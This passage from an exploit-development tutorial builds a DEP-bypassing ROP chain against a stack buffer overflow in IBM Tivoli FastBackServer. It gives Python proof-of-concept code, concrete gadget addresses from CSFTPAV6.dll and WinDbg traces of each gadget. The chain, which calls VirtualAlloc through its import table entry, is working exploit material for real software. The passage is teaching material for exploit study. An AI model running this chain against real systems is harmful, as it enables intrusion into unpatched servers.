formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+eip+rop,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf
...
```

In addition to detecting the offsets, we also need to check for bad characters by reusing a previously described technique. Specifically, we can put all hexadecimal values between 0x00 and 0xFF in our overflow buffer and check which ones might interfere with our exploit.
The bytes shown in Listing 32 represent all of the bad characters we would find.

```
0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20
```

For an exploit that uses ROP gadgets, it's important that the addresses of the gadgets do not contain any of the bad characters.

### Locating Gadgets

With our newly acquired ability to locate gadgets, let's turn our attention to determining which module to use. Up until now, we have focused on FastBackServer.exe, but since the vulnerability we found in the last module is due to unsanitized input to a sscanf call, this will prove to be a problem. Let's find out why.
First, we will use the lm command in WinDbg to dump the base and end address of FastBackServer:

`lm m FastBackServer`

```
Browse full module list
start    end        module name
00400000 00c0c000   FastBackServer   (deferred) 
```

We find the uppermost byte is always `0x00`.

Since the `sscanf` API accepts a null-terminated string as the first argument, and that is the buffer that ends up overflowing the stack buffer, our ROP chain cannot contain any NULL bytes or other bad characters. This implies that the gadgets cannot come from FastBackServer.exe.

We need to find a different module that does not contain a null byte in the uppermost byte and one that is preferably part of the application. If we choose a module that is not part of the application, then the address of gadgets will vary depending on the patch level of the operating system.

Native Windows modules often have additional protections enabled, which will require an even more advanced approach, as we shall find in a future module.

By observing the base and end addresses of all modules bundled with FastBackServer, we find multiple options. One such module is CSFTPAV6.dll as shown in Listing 34:

`lm m CSFTPAV6`

```
Browse full module list
start    end        module name
50500000 50577000   CSFTPAV6   (deferred) 
```

Let's copy CSFTPAV6.dll to the C:\Tools\dep folder where we can use rp++ to generate gadgets, as shown in Listing 35.

```bat
cd C:\Tools\dep
copy "C:\Program Files\Tivoli\TSM\FastBack\server\csftpav6.dll" .
rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt
```

If we open the generated file, we will notice that all the gadgets have an address starting with 0x50, proving that we avoided the upper null byte. Now we are finally able to start building the ROP chain itself.

### Preparing the Battlefield

To start building our ROP chain, let's begin by showing how to use VirtualAlloc to bypass DEP. VirtualAlloc can reserve, commit, or change the state of a region of pages in the virtual address space of the calling process.

The first thing we need to know about VirtualAlloc is its function prototype. This is documented by Microsoft, as shown in Listing 36.

```C
 LPVOID WINAPI VirtualAlloc(
   _In_opt_ LPVOID lpAddress,
   _In_     SIZE_T dwSize,
   _In_     DWORD  flAllocationType,
   _In_     DWORD  flProtect
 );
```

Before our ROP chain invokes VirtualAlloc, we need to make sure that all four parameters have been set up correctly.

If the lpAddress parameter points to an address belonging to a previously committed memory page, we will be able to change the protection settings for that memory page using the flProtect parameter.
This use of VirtualAlloc allows us to achieve the same goal we'd accomplish through the use of VirtualProtect.

As shown in the function prototype, VirtualAlloc requires a parameter (dwSize) for the size of the memory region whose protection properties we are trying to change. However, VirtualAlloc can only change the memory protections on a per-page basis, so as long as our shellcode is less than 0x1000 bytes, we can use any value between 0x01 and 0x1000.
The two final arguments are predefined enums. flAllocationType must be set to the MEM_COMMIT enum value (numerical value 0x00001000), while flProtect should be set to the PAGE_EXECUTE_READWRITE enum value (numerical value 0x00000040).1 This will allow the memory page to be readable, writable, and executable.

We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.

Listing 37 shows an example of the required values for invoking VirtualAlloc with a fictitious stack address of 0x0d2be300 and a fictitious address for VirtualAlloc.

```
0d2be300 75f5ab90 -> KERNEL32!VirtualAllocStub
0d2be304 0d2be488 -> Return address (Shellcode on the stack)
0d2be308 0d2be488 -> lpAddress (Shellcode on the stack)
0d2be30c 00000001 -> dwSize
0d2be310 00001000 -> flAllocationType
0d2be314 00000040 -> flProtect
```

Note the name VirtualAllocStub, instead of VirtualAlloc listed above. The official API name is VirtualAlloc, but the symbol name for it, inside kernel32.dll, is VirtualAllocStub.

There are a few things to note from the example above.
1.	We do not know the VirtualAlloc address beforehand.
2.	We do not know the return address and the lpAddress argument beforehand.
3.	dwSize, flAllocationType, and flProtect contain NULL bytes.

We can deal with these problems by sending placeholder values in the skeleton. We'll then assemble ROP gadgets that will dynamically fix the dummy values, replacing them with the correct ones.

Let's update our proof of concept (Listing 38), and insert the dummy values as the last part of the offset values preceding EIP. They will be placed on the stack just before the return address and the ROP chain.

```python
import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect 

offset = b"A" * (276 - len(va))
eip = b"B" * 4
rop = b"C" * (0x400 - 276 - 4)

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf
...
```

Once the proof of concept is executed, the network packet will trigger the buffer overflow and position the dummy values exactly before the 0x42424242 DWORD that overwrites EIP. We can verify this by restarting FastBackServer and attaching WinDbg.

```
(7b4.88c): Access violation - code c0000005 (first chance)
42424242 ??              ???
```

`dd esp - 1C`

```
0d39e300  45454545 46464646 00000000 48484848
0d39e310  00000000 51515151 42424242 43434343
0d39e320  43434343 43434343 43434343 43434343
0d39e330  43434343 43434343 43434343 43434343
0d39e340  43434343 43434343 43434343 43434343
0d39e350  43434343 43434343 43434343 43434343
0d39e360  43434343 43434343 43434343 43434343
0d39e370  43434343 43434343 43434343 43434343
```

The location of the ROP skeleton is correct, but the DWORDs containing `0x47474747` and `0x49494949` were overwritten with null bytes as part of the process to trigger the vulnerability.

This won't impact us since we're going to overwrite them again with ROP. In the next section, we will take the first step in replacing the dummy values with real values.

### Making ROP's Acquaintance

We have to replace six dummy values on the stack before we can invoke VirtualAlloc, so the first step is to gather the stack address of the first dummy value using ROP gadgets.

The easiest way of obtaining a stack address close to the dummy values is to use the value in ESP at the time of the access violation. We cannot modify the ESP register, since it must always point to the next gadget for ROP to function. Instead, we will copy it into a different register.

We'll have to be creative to get a copy of the ESP register. A gadget like "MOV EAX, ESP ; RET" would be ideal, but they typically do not exist as natural opcodes. In this case, we do some searching and find the following gadget.

```
0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret
```
Listing 40 - Gadget that copies the content of ESP into ESI

Let's examine exactly what this gadget does. First, it will push the content of ESP to the top of the stack. Next, the content of EAX is pushed to the top of the stack, thus moving the value pushed from ESP four bytes farther down the stack.

Next, the POP EDI instruction will pop the value from EAX into EDI and increase the stack pointer by four, effectively making it point to the value originally contained in ESP. Finally, the POP ESI will pop the value from ESP into ESI, performing the copy of the address we need.
The return instruction will force execution to transfer to the next DWORD on the stack. Since this value is controlled by us through the buffer overflow, we can continue execution with additional gadgets.

When learning about ROP for the first time, it is very important to see it in action to get a better understanding of how it all ties together.
We'll update the proof of concept by replacing the value in the eip variable to be the address of the gadget we found, as shown in Listing 41.

```python
...
# psCommandBuffer
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect 

offset = b"A" * (276 - len(va))
eip = pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; ret
rop = b"C" * (0x400 - 276 - 4)

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop,0,0,0,0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf
...
```

Listing 41 - Proof of concept with first gadget address

With the exploit code updated, we restart FastBackServer and attach WinDbg. Before allowing execution to continue, we need to set a breakpoint on the address of the gadget to follow the execution flow, as shown in Listing 42.

`bp 0x50501110`

*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 

`g`

```
Breakpoint 0 hit
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360
eip=50501110 esp=0d5fe31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1110:
50501110 54              push    esp
```

`p`

```
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360
eip=50501111 esp=0d5fe318 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1111:
50501111 50              push    eax
```

`dd esp L1`

```
0d5fe318  0d5fe31c
```

`p`

```
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360
eip=50501112 esp=0d5fe314 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1112:
50501112 5f              pop     edi
```

`dd esp L2`

```
0d5fe314  00000000 0d5fe31c
```

`p`

```
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00000000
eip=50501113 esp=0d5fe318 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1113:
50501113 5e              pop     esi
```

`dd esp L1`

```
0d5fe318  0d5fe31c
```

`p`

```
eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=0d5fe31c edi=00000000
eip=50501114 esp=0d5fe31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1114:
50501114 c3              ret
```

`dd esp L1`

```
0d5fe31c  43434343
```

We hit the breakpoint, and then, when we single-step through the first four instructions, the value in ESP is pushed to the stack and subsequently popped into ESI, as expected.

Additionally, when we reach the return instruction, the uppermost DWORD on the stack is the first of our 0x43434343 values. This will allow us to continue using more gadgets, linking them together in a ROP chain.
At this point, we have found, implemented, and executed our very first ROP gadget. We are well on the way to creating an exploit that will bypass DEP. It is critical to have a firm understanding of the concept of ROP, so this section should be reviewed until the concepts are well-understood before moving forward.

### Obtaining VirtualAlloc Address

We previously determined that we must get the address of VirtualAlloc while the exploit is running. One possible way to do that is to gather its address from the Import Address Table (IAT) of the CSFTPAV6 module.
The IAT is a special table containing the addresses of all APIs that are imported by a module. It is populated when the DLL is loaded into the process. We cannot influence which APIs the target process imports, but we can locate and use the existing ones.

With the help of IDA Pro, we can verify that VirtualAlloc is a function imported from CSFTPAV6.dll by checking the Imports tab as shown below:
 
Figure 8: Grabbing VirtualAlloc address from the IAT

The address of VirtualAlloc will change on reboot, but the address (0x5054A220) of the IAT entry that contains it does not change. This means that we can use the IAT entry along with a memory dereference to fetch the address of VirtualAlloc at runtime. We'll do this as part of our ROP chain.

With a way to resolve the address of VirtualAlloc, we must understand how to use it. In the previous step, we placed a dummy value (0x45454545) on the stack for this API address as part of our buffer overflow, which we need to overwrite.

To do this overwrite, we will need to perform three tasks with our ROP gadgets. First, locate the address on the stack where the dummy DWORD is. Second, we need to resolve the address of VirtualAlloc. Finally, we need to write that value on top of the placeholder value.
We are going to need multiple gadgets for each of these tasks. Let's solve each one of them in order.
For the first part, Listing 43 illustrates what the stack layout is like when the buffer overflow occurs.

```
(7b4.88c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=05e8c638 ecx=0d39ca70 edx=77071670 esi=05e8c638 edi=00669360
eip=42424242 esp=0d39e31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
42424242 ??              ???
```

`dd esp - 1C`

```
0d39e300  45454545 46464646 00000000 48484848
0d39e310  00000000 51515151 42424242 43434343
0d39e320  43434343 43434343 43434343 43434343
0d39e330  43434343 43434343 43434343 43434343
0d39e340  43434343 43434343 43434343 43434343
0d39e350  43434343 43434343 43434343 43434343
0d39e360  43434343 43434343 43434343 43434343
0d39e370  43434343 43434343 43434343 43434343
```

Listing 43 - Stack layout when triggering buffer overflow

The dummy value 0x45454545, which represents the location of the VirtualAlloc address, is at a negative offset of 0x1C from ESP.

Ideally, since we have a copy of the ESP value in ESI, we would like to locate a gadget similar to the following.

SUB ESI, 0x1C
RETN

Listing 44 - Ideal gadget to obtain VirtualAlloc stack absolute address

Sadly, we couldn't find this gadget or a similar one in CSFTPAV6. We'll need to be a bit more creative.

We could put the 0x1C value on the stack as part of our overflowing buffer and then pop that value into another register of our choice using a gadget. This would allow us to subtract the two registers and get the desired address.

The problem with this approach is that the 0x1C value is really 0x0000001C, which has NULL bytes in it.

We can get around the problem by adding -0x1C rather than subtracting 0x1C. The reason this works is because the CPU represents -0x1C as a very large value, as shown in Listing 45.

0:078> ? -0x1c
Evaluate expression: -28 = ffffffe4

Listing 45 - Negative 0x1c does not contain NULL bytes

Now the first part of our game plan is clear. We must put the negative value on the stack, pop it into a register, and then add it to the stack pointer address we stored in ESI.

When using gadgets to perform arithmetic with registers, it is easier to use the EAX and ECX registers than to use ESI. This is due to the number of gadgets available and the usage of the registers in compiled code.

The idea is to have a gadget put a copy of ESI into EAX, then pop the negative value into ECX from the stack. Next, we add ECX to EAX, and finally, copy EAX back into ESI.

Knowing which gadgets to search for and how they can go together is a matter of trial and error combined with experience.

To obtain a copy of ESI in EAX, we can use the gadget "MOV EAX,ESI ; POP ESI; RETN", which does a move operation. Additionally, we can update the rop variable in the proof of concept as shown in Listing 46, so we can put it in action.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 46 - Gadget to move ESI into EAX

Notice that the gadget contains a POP ESI instruction. This requires us to add a dummy DWORD on the stack for alignment.

To observe the execution of the new gadget, we restart FastBackServer, set a breakpoint on the gadget that copies ESP into ESI, and send the packet:

0:058> bp 0x50501110
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
0:058> g
ModLoad: 64640000 6464f000   C:\Windows\SYSTEM32\browcli.dll
Breakpoint 0 hit
eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=05ebb868 edi=00669360
eip=50501110 esp=0d2ce31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1110:
50501110 54              push    esp

0:001> pt
eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000
eip=50501114 esp=0d2ce31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1114:
50501114 c3              ret

0:001> p
eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000
eip=5050118e esp=0d2ce320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x118e:
5050118e 8bc6            mov     eax,esi

0:001> p
eax=0d2ce31c ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000
eip=50501190 esp=0d2ce320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1190:
50501190 5e              pop     esi

0:001> p
eax=0d2ce31c ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=42424242 edi=00000000
eip=50501191 esp=0d2ce324 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1191:
50501191 c3              ret

0:001> dd esp L1
0d2ce324  43434343

Listing 47 - Executing the MOV EAX, ESI gadget

We let the execution go to the end of the first gadget with the pt command and finish its execution with the p command. Now we have entered the gadget containing the MOV EAX, ESI instruction.

Let's note the starting values of EAX and ESI. After the MOV EAX, ESI instruction, EAX contains the same value, which was our goal.
The second instruction pops the dummy value (0x42424242) into ESI, and when we reach the RET instruction, we are ready to execute the next ROP gadget.

At this point, EAX contains the original address from ESP. Next, we have to pop the -0x1C value into ECX and add it to EAX.

We can use a "POP ECX" instruction to get the negative value into ECX, followed by a gadget containing an "ADD EAX, ECX" instruction. This will allow us to add -0x1C to EAX as shown in Listing 48.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 48 - Adding -0x1C to EAX with ROP

The three lines added in the listing above should accomplish this. Before we execute, we set a breakpoint on address 0x505115a3, directly on the POP ECX gadget.

`bp 0x505115a3`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
```

`g`

```
Breakpoint 0 hit
eax=0d67e31c ebx=0605ab78 ecx=0d67ca70 edx=77071670 esi=42424242 edi=00000000
eip=505115a3 esp=0d67e328 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6!FtpUploadFileW+0x705:
505115a3 59              pop     ecx
```

`p`

```
eax=0d67e31c ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
eip=505115a4 esp=0d67e32c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6!FtpUploadFileW+0x706:
505115a4 c3              ret
```

`p`

```
eax=0d67e31c ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
eip=5051579a esp=0d67e330 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6!FtpUploadFileW+0x48fc:
5051579a 03c1            add     eax,ecx
```

`p`

```
eax=0d67e300 ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
eip=5051579c esp=0d67e330 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x48fe:
5051579c c3              ret
```

`dd eax L1`

```
0d67e300  45454545
```

Listing 49 - Executing POP ECX and ADD EAX, ECX gadgets

According to the highlighted registers in Listing 49, EAX and ECX are updated and modified exactly as desired. We transition smoothly from the POP ECX gadget to the ADD EAX, ECX gadget through the RET instruction.

In addition, the final part of the listing has the address in EAX pointing to the 0x45454545 dummy value reserved for VirtualAlloc.
With the correct value in EAX, we need to move that value back to ESI so we can use it in the next stages. We can do this with a gadget containing "PUSH EAX" and "POP ESI" instructions as given in Listing 50.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 50 - Copying EAX into ESI

Once again, we can relaunch FastBackServer and WinDbg and set a breakpoint on the new gadget at `0x50537d5b`.

`bp 0x50537d5b`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
```

`g`

```
Breakpoint 0 hit
eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
eip=50537d5b esp=0d37e334 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x26ebd:
50537d5b 50              push    eax
```

`p`

```
eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
eip=50537d5c esp=0d37e330 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x26ebe:
50537d5c 5e              pop     esi
```

`p`

```
eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000
eip=50537d5d esp=0d37e334 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x26ebf:
50537d5d c3              ret
```

`dd esi L1`

```
0d37e300  45454545
```

Listing 51 - Coping EAX into ESI

After both the push and pop instructions, ESI now has the correct address. The next step is to get the VirtualAlloc address into a register.

We previously found that the IAT address for VirtualAlloc is 0x5054A220, but we know 0x20 is a bad character for our exploit. To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value.

First, we use a POP EAX instruction to fetch the modified IAT address into EAX. Then we'll pop -0x00000001 (or its equivalent, 0xFFFFFFFF) into ECX through a POP ECX instruction. Next, we can reuse the ADD EAX, ECX instruction from the previous gadget to restore the IAT address value.

Finally, we can use a dereference to move the address of VirtualAlloc into EAX through a MOV EAX, DWORD [EAX] instruction. We can see observe gadgets added to the updated ROP chain as shown in Listing 52.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 52 - Moving VirtualAlloc address into EAX

To reiterate, we pop the IAT address of VirtualAlloc increased by one into EAX and pop 0xFFFFFFFF into ECX. Then we add them together to obtain the real VirtualAlloc IAT address in EAX. Finally, we dereference that into EAX.

Once again, we restart FastBackServer and WinDbg. This time, we set a breakpoint on 0x5053a0f5 to skip directly to the gadget containing the POP EAX instruction.

`bp 0x5053a0f5`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
```

`g`

```
Breakpoint 0 hit
eax=0d37e300 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000
eip=5053a0f5 esp=0d37e338 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x29257:
5053a0f5 58              pop     eax
```

`p`

```
eax=5054a221 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000
eip=5053a0f6 esp=0d37e33c ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x29258:
5053a0f6 c3              ret
```

`p`

```
eax=5054a221 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000
eip=505115a3 esp=0d37e340 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x705:
505115a3 59              pop     ecx
```

`p`

```
eax=5054a221 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
eip=505115a4 esp=0d37e344 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x706:
505115a4 c3              ret
```

`p`

```
eax=5054a221 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
eip=5051579a esp=0d37e348 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x48fc:
5051579a 03c1            add     eax,ecx

0:006> p
eax=5054a220 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
eip=5051579c esp=0d37e348 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0x48fe:
5051579c c3              ret
```

`p`

```
eax=5054a220 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
eip=5051f278 esp=0d37e34c ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xe3da:
5051f278 8b00            mov     eax,dword ptr [eax]  ds:0023:5054a220={KERNEL32!VirtualAllocStub (76da38c0)}
```

`p`

```
eax=76da38c0 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
eip=5051f27a esp=0d37e34c ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xe3dc:
5051f27a c3              ret
```

`u eax L1`

```
KERNEL32!VirtualAllocStub:
76da38c0 8bff            mov     edi,edi
```

Listing 53 - Obtaining the address of VirtualAlloc from the IAT

The actions set up by our ROP chain worked out and we have now dynamically obtained the address of VirtualAlloc in EAX. The last step is to overwrite the placeholder value on the stack at the address we have stored in ESI.

We can use an instruction like MOV DWORD [ESI], EAX to write the address in EAX onto the address pointed to by ESI. Our updated ROP chain in Listing 54 reflects this last step.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 54 - Writing address of VirtualAlloc on the stack

As before, we restart FastBackServer and WinDbg and set a breakpoint on the address of our newly added gadget. Now we can send the packet:

`bp 0x5051cbb6`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
```

`g`

```
Breakpoint 0 hit
eax=76da38c0 ebx=0605b070 ecx=ffffffff edx=77071670 esi=0d5fe300 edi=00000000
eip=5051cbb6 esp=0d5fe350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xbd18:
5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d5fe300=45454545
```

`p`

```
eax=76da38c0 ebx=0605b070 ecx=ffffffff edx=77071670 esi=0d5fe300 edi=00000000
eip=5051cbb8 esp=0d5fe350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xbd1a:
5051cbb8 c3              ret
```

`dds esi L1`

```
